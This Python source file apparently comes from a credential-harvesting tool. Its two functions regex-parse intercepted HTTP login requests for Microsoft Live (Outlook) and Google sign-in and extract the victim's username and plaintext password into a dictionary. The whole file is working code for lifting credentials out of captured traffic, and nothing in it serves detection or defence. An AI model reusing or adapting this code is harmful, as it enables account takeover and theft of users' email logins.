import re

def outlook_parse(request):

    creds = {}

    creds['site'] = 'login.live.com'

    login = re.search(rb'login=(.*)&', request).group(1).decode()
    login = login[:login.index('&')]
    creds['username'] = login

    passwd = re.search(rb'passwd=(.*)&', request).group(1).decode()
    passwd = passwd[:passwd.index('&')]
    creds['password'] = passwd
    
    return creds

def google_parse(request):

    # this is probably a really bad way todo this

    creds = {}

    login = None
    password = None

    creds['site'] = 'mail.google.com'

    login = re.search(rb'null%2C%5B%5D%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Ctrue%5D%2C%22(.*)%22%2Cnull%2Cnull%2Cnull%2Ctrue%2Ctrue%2C%5B%5D%5D&bgRequest', request)
    if login is not None:
        login = login.group(1).decode()
        creds['username'] = login

    password = re.search(rb'2Cnull%2Cnull%2Cnull%2C%5B%22(.*)%22%2Cnull%2Ctrue%5D%5D%5D&bgRequest=%5B%22identifier', request)
    if password is not None:
        password = password.group(1).decode()
        creds['password'] = password

    return creds